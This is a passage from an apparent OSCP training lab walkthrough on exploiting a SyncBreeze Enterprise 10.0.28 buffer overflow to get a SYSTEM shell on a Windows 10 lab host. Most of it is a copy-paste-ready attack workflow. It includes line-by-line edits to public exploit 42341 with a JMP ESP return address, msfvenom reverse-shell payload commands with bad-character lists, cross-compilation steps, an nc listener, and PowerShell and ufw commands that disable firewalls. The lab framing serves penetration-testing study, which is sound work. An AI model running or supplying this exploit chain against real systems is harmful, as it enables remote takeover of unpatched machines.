msfvenom ... LPORT=4444 ...
```

**B) Add explicit encoder**:
```bash
msfvenom ... -e x86/shikata_ga_nai ...
```

**C) Find additional bad characters** (manual testing):
```python
badchars = "\x01\x02\x03..." # All except \x00
# Send in exploit, check ESP dump for corruption
```

---

### Issue 6: Debugger Doesn't Pause at Breakpoint

**Symptom**: Application crashes without hitting JMP ESP breakpoint

**Causes & Solutions**:

**A) Wrong address**:
```
Solution: Verify JMP ESP address in Python exploit
grep -i "jmp" 42928.py
```

**B) Breakpoint not set**:
```
Solution: In Immunity Debugger:
Ctrl+G â†’ 10090c83 â†’ F2 (red highlight) â†’ F9
```

**C) Application not attached**:
```
Solution: File > Attach > Select syncbrs > Attach
```

**D) Application not running**:
```
Solution: Start Sync Breeze service first
```

---

## Commands Reference

### Exploitation Workflow (Copy-Paste Ready)

**Phase 1: Setup**
```bash
# Locate exploit
searchsploit "Sync Breeze Enterprise 10.0.28"
searchsploit -m 42341

# Install cross-compiler
sudo apt install mingw-w64 -y
```

**Phase 2: Modify Exploit**
```bash
# Edit 42341.c:
# Line 36: server.sin_addr.s_addr = inet_addr("192.168.165.10");
# Line 38: server.sin_port = htons(80);
# Line 60: "Host: 192.168.165.10\r\n"
# Line 64: "Referer: http://192.168.165.10/login\r\n"
# Line 70: int initial_buffer_size = 781;
# Line 74: unsigned char retn[] = "\x83\x0c\x09\x10";
```

**Phase 3: Generate Shellcode**
```bash
# Verify your IP
ip a | grep "inet 192.168.45"

# Generate payload
msfvenom -p windows/shell_reverse_tcp \
  LHOST=192.168.45.160 \
  LPORT=4444 \
  EXITFUNC=thread \
  -f c \
  -b "\x00\x0a\x0d\x25\x26\x2b\x3d" \
  -e x86/shikata_ga_nai \
  --platform windows \
  -a x86

# Paste output into Line 76 of 42341.c
```

**Phase 4: Compile**
```bash
i686-w64-mingw32-gcc 42341.c -o syncbreeze_exploit.exe -lws2_32
```

**Phase 5: Windows Setup**
```powershell
# Disable firewall (as Administrator)
Set-NetFirewallProfile -Profile Domain,Public,Private -Enabled False

# Start Sync Breeze service (if not running)
# Start > Sync Breeze Enterprise
```

**Phase 6: Exploit**
```bash
# Terminal 1: Start listener
nc -nvlp 4444

# Terminal 2: Run exploit
sudo wine syncbreeze_exploit.exe
```

---

## OSCP Exam Notes

### Skills Demonstrated

**Critical OSCP Skills**:
1. âœ… Locating and analyzing public exploits
2. âœ… Cross-compiling for target platform
3. âœ… Modifying exploit code (IP, port, payload)
4. âœ… Understanding buffer overflow structure
5. âœ… Using Immunity Debugger for verification
6. âœ… Generating shellcode with msfvenom
7. âœ… Troubleshooting failed exploits
8. âœ… Systematic debugging approach

### Exam Application

**This lab is HIGHLY relevant for OSCP exam**:

**Buffer Overflow Machine (25 points)**:
- Same methodology applies
- Must modify/fix public exploits
- Debugger usage required
- Shellcode generation required
- No Metasploit allowed (msfvenom is OK!)

**Time Management**:
- Allocate 60-90 minutes for BOF machine
- Do it FIRST (usually easiest 25 points)
- Have backup exploit ready
- Document every step

---

### Exam Tips

**1. Always read the exploit code**:
```bash
# Don't just run blindly
cat exploit.c
# Look for hardcoded IPs, ports, paths
```

**2. Verify your environment**:
```bash
ip a  # Know your IP
nmap -p- target  # Know open ports
curl -I http://target/path  # Verify paths exist
```

**3. Test compilation first**:
```bash
# Compile before modifying
gcc exploit.c -o exploit
# If fails, fix errors before editing
```

**4. Keep notes**:
```bash
# Document what you change
# Line 36: Changed IP to X.X.X.X
# Line 74: Changed return address to 0xYYYYYYYY
```

**5. Have msfvenom templates ready**:
```bash
# Windows reverse shell
msfvenom -p windows/shell_reverse_tcp LHOST=X LPORT=Y EXITFUNC=thread -f c -b "\x00\x0a\x0d"

# Linux reverse shell
msfvenom -p linux/x86/shell_reverse_tcp LHOST=X LPORT=Y -f c -b "\x00\x0a"
```

**6. Disable firewalls**:
```powershell
# Windows
Set-NetFirewallProfile -Profile Domain,Public,Private -Enabled False

# Linux
sudo ufw disable
```

---

## Lessons Learned

### Technical Lessons

**1. C String Handling is Tricky**:
- `strcat()` stops at NULL byte
- Must account for NULL terminator in size calculations
- Off-by-one errors are common

**2. Always Verify Your IP Address**:
- Don't hardcode IPs
- Use `ip a` to check current IP
- VPN interfaces change IPs

**3. Bad Characters Are Context-Dependent**:
- HTTP exploits have more bad chars than local exploits
- URL encoding chars (%, &, +, =) are problematic
- Test in actual environment

**4. Port Numbers Affect Shellcode**:
- Different ports encode to different bytes
- Changing port can avoid bad characters
- Trial and error sometimes necessary

**5. Cross-Compilation Requires Libraries**:
- Network functions need `-lws2_32`
- Always link required libraries
- Read compiler errors carefully

---

### Methodological Lessons

**1. Systematic Debugging**:
```
Problem â†’ Hypothesis â†’ Test â†’ Verify â†’ Document
```

**2. Use Verified Exploits as Reference**:
- Python exploit had correct return address
- Saved hours of debugging
- "EDB Verified" badge matters

**3. Understand Before Executing**:
- Read the code first
- Understand what each section does
- Know what needs changing

**4. Test in Stages**:
- Compile first (verify syntax)
- Modify IP/port (verify connectivity)
- Update return address (verify offset)
- Replace shellcode (verify execution)

**5. Document Everything**:
- What you changed and why
- Errors encountered and solutions
- Final working configuration

---

### Security Lessons

**1. Never Run Unknown Shellcode**:
- Public exploits may contain backdoors
- Always generate your own payload
- Review hex bytes if suspicious

**2. Firewalls Matter**:
- Default Windows blocks outbound on uncommon ports
- Must be considered in real engagements
- Document firewall state

**3. ASLR/DEP Are Real**:
- This lab had protections disabled
- Real targets may have ASLR enabled
- Return address from DLL may not work
- Need app-specific addresses (no ASLR)

---

## Summary

### What We Accomplished

**Objective**: Exploit SyncBreeze 10.0.28 buffer overflow to obtain SYSTEM shell

**Process**:
1. âœ… Located C-based public exploit
2. âœ… Cross-compiled for Windows on Kali
3. âœ… Modified target IP and port (3 locations)
4. âœ… Updated return address (JMP ESP)
5. âœ… Generated custom shellcode
6. âœ… Fixed NULL terminator off-by-one error
7. âœ… Debugged shellcode corruption
8. âœ… Regenerated payload with different port
9. âœ… Disabled Windows Firewall
10. âœ… Successfully exploited target
11. âœ… Obtained SYSTEM shell

**Result**: Complete control of Windows 10 target system

---

### Final Configuration

```c
// Target: 192.168.165.10:80
// Attacker: 192.168.45.160:4444

// Modified Lines:
Line 36: server.sin_addr.s_addr = inet_addr("192.168.165.10");
Line 38: server.sin_port = htons(80);
Line 60: "Host: 192.168.165.10\r\n"
Line 64: "Referer: http://192.168.165.10/login\r\n"
Line 70: int initial_buffer_size = 781;
Line 74: unsigned char retn[] = "\x83\x0c\x09\x10"; // JMP ESP
Line 76: unsigned char shellcode[] = [msfvenom output LHOST=192.168.45.160 LPORT=4444]

// Compilation:
i686-w64-mingw32-gcc 42341.c -o syncbreeze_exploit.exe -lws2_32

// Execution:
nc -nvlp 4444  # Listener
sudo wine syncbreeze_exploit.exe  # Exploit
```

---

### Time Breakdown

| Phase | Duration |
|-------|----------|
| Setup & compilation | 10 minutes |
| Initial modifications | 15 minutes |
| NULL terminator debugging | 20 minutes |
| IP mismatch discovery | 10 minutes |
| Shellcode corruption debugging | 30 minutes |
| Successful exploitation | 5 minutes |
| **Total** | **90 minutes** |

---

### Key Takeaways

**Most Important Skills**:
1. Reading and understanding exploit code
2. Systematic debugging approach
3. Understanding buffer overflow mechanics
4. Shellcode generation with bad character exclusions
5. Using debugger to verify exploitation stages

**Most Common Mistakes**:
1. Not verifying actual IP address
2. Forgetting NULL terminator in buffer calculations
3. Using unknown/untrusted shellcode
4. Not disabling firewall
5. Skipping code analysis

**Success Factors**:
1. Using verified Python exploit as reference
2. Understanding C string functions
3. Methodical troubleshooting
4. Patience with shellcode generation
5. Complete documentation

---

**Document Version**: 1.0
**Last Updated**: 2025-10-06
**Lab**: OSCP Chapter 13 - Public Exploits Lab 4
**Exploit**: SyncBreeze Enterprise 10.0.28 Buffer Overflow
**Status**: âœ… Successfully Exploited
**Shell Obtained**: SYSTEM on Windows 10

---

**End of Detailed Walkthrough**
